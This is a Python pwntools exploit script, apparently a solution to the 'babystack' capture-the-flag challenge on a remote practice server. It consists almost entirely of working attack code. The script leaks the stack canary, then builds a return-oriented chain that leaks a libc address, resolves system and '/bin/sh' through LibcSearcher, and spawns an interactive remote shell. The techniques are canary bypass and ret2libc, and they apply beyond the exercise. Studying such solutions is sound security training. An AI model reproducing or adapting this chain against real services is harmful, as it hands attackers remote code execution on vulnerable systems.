# coding:utf-8

from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64',log_level='debug')
#p = process('babystack')
p = remote('node3.buuoj.cn', 25941)
elf = ELF('babystack')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
# main_addr = elf.sym['main']
main_addr = 0x0400908
pop_rdi_ret = 0x0400a93     # ropper; search pop rdi; ret
padding = 'a' * (0x90 - 0x08)
fake_ebp = 'k1ose2jo'

# leak canary
p.sendlineafter('>>', '1')
p.sendline(padding)
p.sendlineafter('>>', '2')
p.recvuntil('a\n')
canary = u64(p.recv(7).rjust(8,'\x00'))
print('canary: ', hex(canary))

# stack overflow, leaking the libc version
payload1 = padding + p64(canary) + fake_ebp
payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter('>>', '1')
p.sendline(payload1)
p.sendlineafter('>>', '3')
p.recv()
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')

# libc -> system('/bin/sh')
payload2 = padding + p64(canary) + fake_ebp
payload2 += p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr)
p.sendlineafter('>>', '1')
p.sendline(payload2)
p.sendlineafter('>>', '3')
p.interactive()

